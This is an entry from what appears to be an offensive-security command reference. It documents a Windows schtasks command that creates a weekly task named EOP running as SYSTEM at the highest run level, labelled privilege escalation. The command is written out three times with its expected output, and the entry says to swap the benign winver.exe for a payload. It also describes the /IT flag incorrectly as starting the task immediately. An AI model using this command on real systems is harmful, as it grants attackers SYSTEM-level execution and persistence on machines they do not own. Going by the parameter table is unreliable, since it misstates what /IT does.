---
data: >-
  schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR
  C:\Windows\System32\winver.exe /IT /RL HIGHEST
tags:
  - privilege-escalation
  - scheduled-task
type: command
output: 'SUCCESS: The scheduled task "EOP" has successfully been created'
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.403Z'
id: 7706793e-4ce5-4081-b128-4f3f992ad10f
verified: false
validated: true
submitted: true
---
# Schtasks Create Elevated Task

## Command

```cmd
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
```

## Description

Creates a scheduled task running as SYSTEM with highest privileges for privilege escalation on Windows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /SC WEEKLY | Schedule type (weekly) | Yes |
| /RU "NT AUTHORITY\SYSTEM" | Run as SYSTEM | Yes |
| /TN EOP | Task name | Yes |
| /TR C:\Windows\System32\winver.exe | Task to run (replace with payload) | Yes |
| /IT | Start immediately | Yes |
| /RL HIGHEST | Highest run level | Yes |

## Examples

### Basic Usage

```cmd
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
```

### Advanced Usage

Replace /TR with custom executable for payload.

## Expected Output

"SUCCESS: The scheduled task \"EOP\" has successfully been created."

## Related

- [[Related Procedure: Escalate to SYSTEM via Scheduled Task]]
